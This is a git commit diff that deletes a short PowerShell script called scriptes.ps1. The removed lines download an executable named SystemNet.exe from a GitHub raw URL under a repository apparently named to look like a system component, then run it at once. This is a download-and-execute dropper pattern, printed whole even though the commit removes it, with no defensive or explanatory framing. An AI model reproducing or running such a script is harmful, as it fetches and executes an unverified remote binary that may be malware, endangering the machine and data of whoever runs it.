b43fe965fe2a0934d11615c38638e8cd086d5e6b
crypt0n-root <66523759+crypt0n-root@users.noreply.github.com>
2021-07-11 23:52:10 +0300

    Delete scriptes.ps1

--- scriptes.ps1
+++
@@ -1,5 +0,0 @@
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Tls,Tls11,Tls12'
-
-Invoke-WebRequest -Uri 'raw.githubusercontent.com/superroot/systemdll/SystemNet.exe' -OutFile SystemNet.exe
-
-.\SystemNet.exe
